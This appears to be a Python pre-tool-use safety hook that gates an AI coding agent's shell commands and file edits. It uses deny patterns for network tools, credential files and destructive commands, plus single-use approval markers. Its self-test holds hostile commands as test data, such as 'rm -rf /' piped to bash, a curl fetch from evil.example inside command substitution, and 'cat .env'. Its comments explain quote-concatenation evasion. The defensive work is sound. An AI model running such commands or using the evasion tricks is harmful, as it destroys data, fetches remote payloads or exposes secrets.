#!/usr/bin/env python3
"""PreToolUse hook adapter: classifies a raw Claude Code tool call into the
deterministic gate scripts' inputs.

The gate scripts (atx_fast_lane_gate.py, atx_hook_runner.py) take already-known
facts as explicit flags. They do not introspect a Bash command or an Edit's
file path. This adapter is the missing, narrow translation layer: cheap
pattern matching only. It does not perform risk, truth, or business judgment.

Design (conservative allowlist, decided 2026-06-19):
- Default to ESCALATE every Bash/Edit/Write call.
- Skip escalation only when the call matches a known-safe pattern.
- Escalated calls are checked against automatic-trigger patterns
  (live-system, credentials, durable-law change, irreversible). A match is a
  hard block (exit 2). No match still escalates, but only as a non-blocking
  context injection via the multi-agent engagement packet (exit 0).

Automatic triggers have single-use, per-action approval-marker overrides after
they stop and explicit scoped operator approval is recorded in conversation.
Durable-law edits use an exact path marker. Live-system, credential-touching,
and irreversible commands use exact command markers. Markers are consumed on
use and never authorize storing or exposing secret values in markdown or chat.

Known limitation: legal/compliance/financial and public/client-facing
conditions are not detectable from a file path or shell command alone and are
deliberately NOT pattern-matched here. They remain the agent's self-checklist
responsibility (Fix 2), not this adapter's.

Codex CLI support (added 2026-06-19): Codex's file-edit tool is named
"apply_patch", not "Edit"/"Write", and its tool_input carries a raw patch
blob under the "command" key (per developers.openai.com/codex/hooks, fetched
directly -- not live-tested against an actual Codex session in this
environment, only against the documented wire protocol and this script's own
self-test). Paths are extracted from the patch's "*** Update/Add/Delete
File:" headers. If Codex's actual payload shape differs from the documented
one, this will silently no-op (kind "other") rather than crash -- flagged as
an open verification item, not a guarantee.
"""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(Path(__file__).resolve().parent))

import atx_hook_runner  # noqa: E402
import atx_multi_agent_gate  # noqa: E402

import argparse


SAFE_BASH_PATTERNS = [
    r"^git\s+(status|diff|log|show|branch(\s|$))",
    r"^ls(\s|$)",
    r"^cat(\s|$)",
    r"^python[3]?\s+.*--self-test\b",
    r"^python[3]?\s+.*--scan\b",
    r"^echo(\s|$)",
    r"^pwd(\s|$)",
]

SAFE_PATH_PREFIXES = [
    "_examples/",
    "_routing/references/",
    "_memory/source-archive/",
]

LIVE_SYSTEM_PATTERNS = [
    r"\bgit\s+push\b",
    r"\bgh\s+pr\s+(create|merge)\b",
    r"\bcurl\b",
    r"\bwget\b",
    r"\bdeploy\b",
    r"\bvercel\b",
    r"\bnetlify\b",
    r"\bssh\b",
    r"\bscp\b",
    r"\baz\s",
    r"\baws\s",
    r"\bgcloud\s",
]

CREDENTIAL_PATTERNS = [
    r"\.env\b",
    r"\bsecret\b",
    r"\bcredential\b",
    r"\btoken\b",
    r"\bapi[_-]?key\b",
]

IRREVERSIBLE_PATTERNS = [
    r"\brm\s+-rf\b",
    r"\bgit\s+push\s+--force\b",
    r"\bgit\s+reset\s+--hard\b",
    r"\bgit\s+branch\s+-D\b",
    r"\bDROP\s+TABLE\b",
]

DURABLE_LAW_PATH_PATTERNS = [
    r"^CLAUDE\.md$",
    r"^AGENTS\.md$",
    r"^_governance/",
    r"^_routing/runtime/",
    r"^_agents/.*/CONTRACT\.md$",
    r"^_routing/.*-standard\.md$",
    r"^ROUTING\.md$",
]

BUILD_PATH_PATTERNS = [
    r"^_routing/.*\.py$",
    r"^\.githooks/",
    r"^\.claude/",
]


def relative_path(file_path: str) -> str:
    try:
        return Path(file_path).resolve().relative_to(ROOT).as_posix()
    except ValueError:
        return file_path.replace("\\", "/")


def matches_any(patterns: list[str], text: str) -> bool:
    return any(re.search(pattern, text, re.IGNORECASE) for pattern in patterns)


# Trigger-word false positives (added 2026-06-19, found live): the matcher
# scans the WHOLE raw command string, so a trigger word sitting inside inert
# text -- a quoted commit message, a file's literal content via printf --
# trips the same pattern as an actual subcommand. Caught twice in one
# session: "git commit -m '...mentions git push...'" and a printf writing a
# string containing "git push" to a file.
#
# Fix is intentionally NARROW, not a blanket "strip every quoted string."
# A blanket strip is unsound: shell word concatenation lets adjacent quoted
# spans glue into one token the shell actually runs (e.g. 'rm -r''f' build/
# executes as `rm -rf build/`), so stripping each quoted span independently
# can erase a real dangerous command without the remainder ever matching the
# trigger pattern -- a false negative, the wrong direction (flagged by
# automated security review, 2026-06-19, and confirmed correct on
# inspection). Instead, only the exact known-inert shapes that caused the
# two real false positives are stripped: a git commit message argument, and
# a printf/echo string that lands in a file (never piped to an interpreter).
# Everything else is scanned as raw text, unchanged from before.
INTERPRETER_TOKENS = (
    r"bash|sh|zsh|dash|ksh|csh|tcsh|fish|python[23]?|ipython|node|perl|ruby|"
    r"php|lua|awk|sed|pwsh|powershell|env"
)

DYNAMIC_EXEC_PATTERNS = [
    r"\beval\b",
    r"\bexec\b",
    rf"\b(?:{INTERPRETER_TOKENS})\b[^\n]*(?:\s-[ceErXIS]\w*|\s+['\"])",
    rf"\|\s*(?:{INTERPRETER_TOKENS})\b",
    rf"\b(?:{INTERPRETER_TOKENS})\b[^\n]*<<",
]

HEREDOC_BODY_PATTERN = re.compile(
    r"<<-?\s*(['\"]?)(\w+)\1\s*\n.*?\n\2\s*$", re.DOTALL | re.MULTILINE
)

GIT_COMMIT_MESSAGE_PATTERN = re.compile(
    r"(\bgit\s+commit\b[^\n;&|]*?(?:-m|--message)\s+)(['\"])(.*?)\2", re.DOTALL
)

PRINTF_ECHO_TO_FILE_PATTERN = re.compile(
    r"(\b(?:printf|echo)\s+)(['\"])(.*?)\2([^\n|]*>{1,2}\s*\S)", re.DOTALL
)


def has_dynamic_execution_risk(text: str) -> bool:
    return matches_any(DYNAMIC_EXEC_PATTERNS, text)


def _strip_unless_executable(quote: str, body: str) -> bool:
    """A double-quoted string can still run code via command substitution;
    single-quoted strings never can, by POSIX shell rules -- $(...) or
    backticks inside single quotes are literal text, never evaluated."""
    if quote == "'":
        return True
    return "$(" not in body and "`" not in body


def strip_inert_text(text: str) -> str:
    text = HEREDOC_BODY_PATTERN.sub(
        lambda m: f"<<{m.group(1)}{m.group(2)}{m.group(1)}\n[STRIPPED]\n{m.group(2)}", text
    )

    def commit_message_repl(m: re.Match) -> str:
        prefix, quote, body = m.group(1), m.group(2), m.group(3)
        if not _strip_unless_executable(quote, body):
            return m.group(0)
        return f"{prefix}{quote}[STRIPPED]{quote}"

    text = GIT_COMMIT_MESSAGE_PATTERN.sub(commit_message_repl, text)

    def printf_echo_repl(m: re.Match) -> str:
        prefix, quote, body, suffix = m.group(1), m.group(2), m.group(3), m.group(4)
        if not _strip_unless_executable(quote, body):
            return m.group(0)
        return f"{prefix}{quote}[STRIPPED]{quote}{suffix}"

    text = PRINTF_ECHO_TO_FILE_PATTERN.sub(printf_echo_repl, text)
    return text


def text_for_pattern_scan(text: str) -> str:
    if has_dynamic_execution_risk(text):
        return text
    return strip_inert_text(text)


PATCH_FILE_HEADER = re.compile(
    r"^\*\*\*\s+(?:Update|Add|Delete)\s+File:\s*(.+?)\s*$", re.MULTILINE
)


def extract_patch_paths(patch_text: str) -> list[str]:
    return [relative_path(m.group(1)) for m in PATCH_FILE_HEADER.finditer(patch_text)]


def extract_target(tool_name: str, tool_input: dict) -> tuple[str, str]:
    """Returns (kind, text) where kind is 'path', 'command', or 'patch'."""
    if tool_name in {"Edit", "Write", "NotebookEdit"}:
        return "path", relative_path(tool_input.get("file_path", ""))
    if tool_name == "Bash":
        return "command", tool_input.get("command", "")
    if tool_name == "apply_patch":
        # Codex CLI: file_path may or may not be present depending on actual
        # runtime payload shape; fall back to parsing the patch blob in
        # tool_input["command"] if it isn't.
        if tool_input.get("file_path"):
            return "path", relative_path(tool_input["file_path"])
        return "patch", tool_input.get("command", "") or tool_input.get("patch", "")
    return "other", ""


def is_safe(kind: str, text: str) -> bool:
    if kind == "path":
        return any(text.startswith(prefix) for prefix in SAFE_PATH_PREFIXES)
    if kind == "command":
        return matches_any(SAFE_BASH_PATTERNS, text.strip())
    return False


APPROVAL_MARKER = ROOT / "_routing" / ".pretooluse-approval"
LIVE_SYSTEM_APPROVAL_MARKER = ROOT / "_routing" / ".live-system-approval"
SENSITIVE_ACTION_APPROVAL_MARKER = ROOT / "_routing" / ".sensitive-action-approval"


def consume_approval(target_path: str) -> bool:
    """Single-use approval channel for the durable-law-edit trigger ONLY.

    Never applies to command triggers. The marker must name the exact approved
    path and is deleted on use so it cannot be reused or left lying around as
    a standing bypass.
    """
    if not APPROVAL_MARKER.exists():
        return False
    approved_path = APPROVAL_MARKER.read_text(encoding="utf-8").strip()
    if approved_path != target_path:
        return False
    APPROVAL_MARKER.unlink()
    return True


def consume_live_system_approval(command_text: str) -> bool:
    """Single-use approval channel for the live-system trigger ONLY (added
    2026-06-19, mirrors the durable-law channel above).

    Never applies to credential or irreversible-command triggers. The marker
    must name the exact approved command verbatim and is deleted on use.
    """
    if not LIVE_SYSTEM_APPROVAL_MARKER.exists():
        return False
    approved_command = LIVE_SYSTEM_APPROVAL_MARKER.read_text(encoding="utf-8").strip()
    if approved_command != command_text.strip():
        return False
    LIVE_SYSTEM_APPROVAL_MARKER.unlink()
    return True


def consume_sensitive_action_approval(command_text: str) -> bool:
    """Single-use approval channel for credential-touching and irreversible
    command triggers (corrected 2026-06-20).

    The marker must name the exact approved command verbatim and is deleted on
    use. It does not permit writing secrets into markdown or chat.
    """
    if not SENSITIVE_ACTION_APPROVAL_MARKER.exists():
        return False
    approved_command = SENSITIVE_ACTION_APPROVAL_MARKER.read_text(encoding="utf-8").strip()
    if approved_command != command_text.strip():
        return False
    SENSITIVE_ACTION_APPROVAL_MARKER.unlink()
    return True


def automatic_trigger(kind: str, text: str) -> str | None:
    if kind == "path" and matches_any(DURABLE_LAW_PATH_PATTERNS, text):
        if consume_approval(text):
            return None
        return "Changes durable root law, routing law, governance, or doctrine."
    if kind == "command":
        scan_text = text_for_pattern_scan(text)
        if matches_any(CREDENTIAL_PATTERNS, scan_text):
            if consume_sensitive_action_approval(text):
                return None
            return "Touches credentials, secrets, keys, tokens, or private env values."
        if matches_any(IRREVERSIBLE_PATTERNS, scan_text):
            if consume_sensitive_action_approval(text):
                return None
            return "Action is irreversible or rollback is unclear."
        if matches_any(LIVE_SYSTEM_PATTERNS, scan_text):
            if consume_live_system_approval(text):
                return None
            return "Touches live systems, external accounts, third-party writes, or deployment."
    return None


def is_build_shaped(kind: str, text: str) -> bool:
    return kind == "path" and matches_any(BUILD_PATH_PATTERNS, text)


def run_check(tool_name: str, tool_input: dict) -> int:
    kind, text = extract_target(tool_name, tool_input)

    if kind == "other" or not text:
        return 0

    if kind == "patch":
        paths = extract_patch_paths(text)
        if not paths:
            return 0
        for path in paths:
            result = run_check_path(path)
            if result != 0:
                return result
        return 0

    return run_check_path(text) if kind == "path" else run_check_command(text)


def run_check_path(text: str) -> int:
    return _run_check(kind="path", text=text)


def run_check_command(text: str) -> int:
    return _run_check(kind="command", text=text)


def _run_check(kind: str, text: str) -> int:
    tool_name = "Edit" if kind == "path" else "Bash"
    # Automatic triggers are checked BEFORE the safe-allowlist, on purpose.
    # A command can match a "safe" prefix (e.g. "cat ...") and still touch a
    # credential file -- the allowlist must never shadow a real trigger.
    trigger_reason = automatic_trigger(kind, text)
    if trigger_reason:
        print(
            "Command Center OS PreToolUse gate blocked this action:\n"
            f"  status: block\n"
            f"  matched automatic trigger: {trigger_reason}\n"
            f"  target: {text}\n"
            "  next: this is an automatic Risk-4-equivalent trigger. Stop. Produce a "
            "decision packet and get explicit approval before retrying. Do not "
            "re-run with a workaround.\n",
            file=sys.stderr,
        )
        return 2

    if is_safe(kind, text):
        return 0

    work_type = "build" if is_build_shaped(kind, text) else None
    args = argparse.Namespace(
        request=f"{tool_name} on {text}",
        work_type=work_type,
        trigger="pre-task multi-agent engagement check (adapter escalation)",
        scope=text,
        workspace="root",
        risk=None,
        memory_impact="check",
        build_handoff_approved=False,
    )
    packet = atx_hook_runner.add_hook_result(
        argparse.Namespace(event="pre-task", changed_file=[text], allow_build_handoff=False),
        atx_multi_agent_gate.packet_for(args),
    )
    print(atx_hook_runner.render_markdown(packet), file=sys.stdout)
    if packet["hook_result"]["status"] != "pass":
        print(
            "Command Center OS PreToolUse gate: deterministic check did not pass. Review the "
            "packet above before proceeding.",
            file=sys.stderr,
        )
        return 2
    return 0


def run_self_test() -> int:
    cases = [
        ("Bash", {"command": "git status"}, 0),
        ("Bash", {"command": "git push origin main"}, 2),
        ("Bash", {"command": "rm -rf build/"}, 2),
        ("Edit", {"file_path": str(ROOT / "CLAUDE.md")}, 2),
        ("Edit", {"file_path": str(ROOT / "_examples" / "notes.md")}, 0),
        ("Write", {"file_path": str(ROOT / "_routing" / "references" / "x.md")}, 0),
        ("Edit", {"file_path": str(ROOT / "_routing" / "some_module.py")}, 0),
        (
            "apply_patch",
            {"command": "*** Begin Patch\n*** Update File: CLAUDE.md\n*** End Patch\n"},
            2,
        ),
        (
            "apply_patch",
            {"command": "*** Begin Patch\n*** Update File: _examples/notes.md\n*** End Patch\n"},
            0,
        ),
        (
            "apply_patch",
            {
                "command": (
                    "*** Begin Patch\n*** Add File: _examples/a.md\n"
                    "*** Update File: AGENTS.md\n*** End Patch\n"
                )
            },
            2,
        ),
    ]
    for tool_name, tool_input, expected in cases:
        actual = run_check(tool_name, tool_input)
        if actual != expected:
            print(
                f"FAIL {tool_name} {tool_input} expected {expected} got {actual}",
                file=sys.stderr,
            )
            return 1

    # Approval-marker channel: scoped to durable-law trigger only, single-use.
    if APPROVAL_MARKER.exists():
        APPROVAL_MARKER.unlink()
    APPROVAL_MARKER.write_text("CLAUDE.md", encoding="utf-8")
    approved = run_check("Edit", {"file_path": str(ROOT / "CLAUDE.md")})
    if approved != 0:
        print(f"FAIL approval marker did not allow approved edit, got {approved}", file=sys.stderr)
        return 1
    if APPROVAL_MARKER.exists():
        print("FAIL approval marker was not consumed after use", file=sys.stderr)
        return 1
    second_attempt = run_check("Edit", {"file_path": str(ROOT / "CLAUDE.md")})
    if second_attempt != 2:
        print(f"FAIL approval marker was reusable, got {second_attempt}", file=sys.stderr)
        return 1
    # Approval marker must never apply to command triggers.
    APPROVAL_MARKER.write_text("git push origin main", encoding="utf-8")
    live_system_attempt = run_check("Bash", {"command": "git push origin main"})
    APPROVAL_MARKER.unlink()
    if live_system_attempt != 2:
        print("FAIL approval marker incorrectly applied to a live-system trigger", file=sys.stderr)
        return 1

    # Live-system approval-marker channel: scoped to live-system trigger only, single-use.
    if LIVE_SYSTEM_APPROVAL_MARKER.exists():
        LIVE_SYSTEM_APPROVAL_MARKER.unlink()
    LIVE_SYSTEM_APPROVAL_MARKER.write_text("git push origin main", encoding="utf-8")
    live_approved = run_check("Bash", {"command": "git push origin main"})
    if live_approved != 0:
        print(f"FAIL live-system approval marker did not allow approved command, got {live_approved}", file=sys.stderr)
        return 1
    if LIVE_SYSTEM_APPROVAL_MARKER.exists():
        print("FAIL live-system approval marker was not consumed after use", file=sys.stderr)
        return 1
    live_second_attempt = run_check("Bash", {"command": "git push origin main"})
    if live_second_attempt != 2:
        print(f"FAIL live-system approval marker was reusable, got {live_second_attempt}", file=sys.stderr)
        return 1
    # A live-system marker must only match its exact approved command, not any live-system command.
    LIVE_SYSTEM_APPROVAL_MARKER.write_text("git push origin main", encoding="utf-8")
    mismatched_attempt = run_check("Bash", {"command": "curl https://example.com/deploy"})
    LIVE_SYSTEM_APPROVAL_MARKER.unlink()
    if mismatched_attempt != 2:
        print("FAIL live-system marker matched a different command than the one it named", file=sys.stderr)
        return 1
    # Live-system approval marker must never apply to credential or irreversible triggers.
    LIVE_SYSTEM_APPROVAL_MARKER.write_text("cat .env", encoding="utf-8")
    credential_attempt = run_check("Bash", {"command": "cat .env"})
    LIVE_SYSTEM_APPROVAL_MARKER.unlink()
    if credential_attempt != 2:
        print("FAIL live-system approval marker incorrectly applied to a credential trigger", file=sys.stderr)
        return 1
    LIVE_SYSTEM_APPROVAL_MARKER.write_text("git push --force origin main", encoding="utf-8")
    irreversible_attempt = run_check("Bash", {"command": "git push --force origin main"})
    LIVE_SYSTEM_APPROVAL_MARKER.unlink()
    if irreversible_attempt != 2:
        print("FAIL live-system approval marker incorrectly applied to an irreversible trigger", file=sys.stderr)
        return 1

    # Sensitive-action approval marker: scoped to credential-touching and
    # irreversible triggers only, exact command, single-use.
    if SENSITIVE_ACTION_APPROVAL_MARKER.exists():
        SENSITIVE_ACTION_APPROVAL_MARKER.unlink()
    SENSITIVE_ACTION_APPROVAL_MARKER.write_text("cat .env", encoding="utf-8")
    credential_approved = run_check("Bash", {"command": "cat .env"})
    if credential_approved != 0:
        print(f"FAIL sensitive-action marker did not allow approved credential command, got {credential_approved}", file=sys.stderr)
        return 1
    if SENSITIVE_ACTION_APPROVAL_MARKER.exists():
        print("FAIL sensitive-action marker was not consumed after credential use", file=sys.stderr)
        return 1
    credential_replay = run_check("Bash", {"command": "cat .env"})
    if credential_replay != 2:
        print(f"FAIL sensitive-action marker was reusable for credential command, got {credential_replay}", file=sys.stderr)
        return 1
    SENSITIVE_ACTION_APPROVAL_MARKER.write_text("rm -rf build/", encoding="utf-8")
    irreversible_approved = run_check("Bash", {"command": "rm -rf build/"})
    if irreversible_approved != 0:
        print(f"FAIL sensitive-action marker did not allow approved irreversible command, got {irreversible_approved}", file=sys.stderr)
        return 1
    if SENSITIVE_ACTION_APPROVAL_MARKER.exists():
        print("FAIL sensitive-action marker was not consumed after irreversible use", file=sys.stderr)
        return 1
    SENSITIVE_ACTION_APPROVAL_MARKER.write_text("cat .env", encoding="utf-8")
    credential_mismatch = run_check("Bash", {"command": "cat .env.local"})
    SENSITIVE_ACTION_APPROVAL_MARKER.unlink()
    if credential_mismatch != 2:
        print("FAIL sensitive-action marker matched a different command than the one it named", file=sys.stderr)
        return 1
    SENSITIVE_ACTION_APPROVAL_MARKER.write_text("git push origin main", encoding="utf-8")
    live_with_sensitive_marker = run_check("Bash", {"command": "git push origin main"})
    SENSITIVE_ACTION_APPROVAL_MARKER.unlink()
    if live_with_sensitive_marker != 2:
        print("FAIL sensitive-action marker incorrectly applied to live-system trigger", file=sys.stderr)
        return 1

    # Trigger words inside inert text (quoted strings, heredoc data) must not
    # falsely trip a pattern -- the two real false positives hit live.
    inert_text_cases = [
        (
            "Bash",
            {
                "command": (
                    "git commit -m \"A real git push got hard-blocked; "
                    "Credential triggers use scoped approval.\""
                )
            },
            0,
        ),
        ("Bash", {"command": "printf 'git push origin master' > some_file.txt"}, 0),
    ]
    for tool_name, tool_input, expected in inert_text_cases:
        actual = run_check(tool_name, tool_input)
        if actual != expected:
            print(
                f"FAIL inert-text case {tool_name} {tool_input} expected {expected} got {actual}",
                file=sys.stderr,
            )
            return 1

    # But text that could actually execute must still be scanned and blocked.
    dynamic_exec_cases = [
        ("Bash", {"command": "bash -c 'git push origin master'"}, 2),
        ("Bash", {"command": "cat <<'EOF' | bash\nrm -rf /\nEOF"}, 2),
        ("Bash", {"command": "bash <<'EOF'\nrm -rf /\nEOF"}, 2),
        ("Bash", {"command": 'echo "$(curl https://evil.example/payload)"'}, 2),
        # Command substitution inside a double-quoted commit message is real
        # code, not data -- must not be stripped just because it follows -m.
        ("Bash", {"command": 'git commit -m "$(curl https://evil.example/payload)"'}, 2),
        # Piping a printf string straight to an interpreter is real
        # execution -- the printf/echo-to-file allowlist must not apply.
        ("Bash", {"command": "printf 'rm -rf /' | bash"}, 2),
        # awk/perl/sed inline programs are code, not data -- must register as
        # dynamic-execution risk even without an explicit -c flag.
        ("Bash", {"command": "awk 'BEGIN{system(\"git push origin main\")}'"}, 2),
        ("Bash", {"command": "perl -e 'system(\"git push origin main\")'"}, 2),
    ]
    for tool_name, tool_input, expected in dynamic_exec_cases:
        actual = run_check(tool_name, tool_input)
        if actual != expected:
            print(
                f"FAIL dynamic-exec case {tool_name} {tool_input} expected {expected} got {actual}",
                file=sys.stderr,
            )
            return 1

    print("PASS pretooluse adapter self-test")
    return 0


def main() -> int:
    if "--self-test" in sys.argv:
        return run_self_test()
    try:
        payload = json.load(sys.stdin)
    except (json.JSONDecodeError, ValueError):
        return 0
    tool_name = payload.get("tool_name", "")
    tool_input = payload.get("tool_input", {}) or {}
    if tool_name not in {"Bash", "Edit", "Write", "NotebookEdit", "apply_patch"}:
        return 0
    return run_check(tool_name, tool_input)


if __name__ == "__main__":
    raise SystemExit(main())
